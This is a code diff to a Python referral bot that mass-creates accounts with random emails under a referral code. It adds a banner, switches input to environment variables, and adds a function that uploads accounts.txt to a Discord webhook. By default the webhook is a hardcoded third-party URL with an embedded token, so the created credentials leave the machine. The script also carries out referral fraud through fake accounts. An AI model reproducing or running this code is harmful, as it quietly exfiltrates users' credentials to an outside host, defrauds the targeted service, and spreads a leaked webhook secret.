@@ -5,6 +5,26 @@ import string
 import time
 import threading
 import queue
+import os
+
+print(r"""
+ ▄████▄   ██▓           █    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄      
+▒██▀ ▀█  ▓██▒           ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    
+▒▓█    ▄ ▒██░          ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  
+▒▓▓▄ ▄██▒▒██░          ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ 
+▒ ▓███▀ ░░██████▒      ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒
+░ ░▒ ▒  ░░ ▒░▓  ░      ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
+  ░  ▒   ░ ░ ▒  ░      ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░
+░          ░ ░          ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒   
+░ ░          ░  ░         ░         ░  ░          ░           ░  ░
+░                                                                 
+      By MoGlitch & Wazer (Code Luck Team ❤)
+
+
+
+      
+""")
+time.sleep(1)
 
 def generate_random_email():
     return ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
@@ -90,10 +110,37 @@ def delete_account(session, password, result_queue, index):
             "index": index
         })
 
+def send_to_webhook(webhook_url, file_path):
+    try:
+        if not os.path.exists(file_path):
+            print(f"❌ Error: {file_path} does not exist.")
+            return
+
+        with open(file_path, "rb") as file:
+            files = {
+                "file": (file_path, file, "text/plain")
+            }
+            response = requests.post(webhook_url, files=files, timeout=10)
+
+        if response.status_code == 200 or response.status_code == 204:
+            print("📤 accounts.txt sent to Discord webhook successfully.")
+        else:
+            print(f"❌ Failed to send accounts.txt to webhook (Status: {response.status_code})")
+
+    except Exception as e:
+        print(f"❌ Error sending file to webhook: {str(e)}")
+
 def main():
-    ref_code = input("Enter your referral code (e.g., ORiUKq12r4gnUd8F): ").strip()
-    account_count = int(input("Enter the number of accounts to create: "))
-    max_threads = int(input("Enter the number of threads (1-20 recommended): "))
+    webhook_url = os.getenv("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1393161594707513354/JwURmSERnHSevTZk88pNQpbPQDELkv9PBYUm9F1tUtaBEfGq9KzgS2IT-kcjgqDbhUC5")
+    ref_code = os.getenv("REF_CODE")
+    account_count = int(os.getenv("ACCOUNT_COUNT", "1"))
+    max_threads = int(os.getenv("MAX_THREADS", "1"))
+    delete_option = os.getenv("DELETE_ACCOUNTS", "no").lower()
+
+    if not ref_code:
+        print("❌ Error: REF_CODE environment variable is required.")
+        return
+
     max_threads = min(max(account_count, 1), max_threads, 20)  # Cap at 20 to avoid server issues
 
     created_accounts = []
@@ -137,9 +184,11 @@ def main():
     print(f"\n✅ Created {len(created_accounts)} accounts in {round(end_time - start_time, 2)} seconds.")
     print("📁 Saved to accounts.txt")
 
+    # Send accounts.txt to webhook
+    send_to_webhook(webhook_url, "accounts.txt")
+
     # Account deletion
-    delete_option = input("\n❓ Do you want to delete all created accounts? (y/n): ").strip().lower()
-    if delete_option == "y":
+    if delete_option == "yes":
         delete_queue = queue.Queue()
         delete_start_time = time.time()
         threads = []
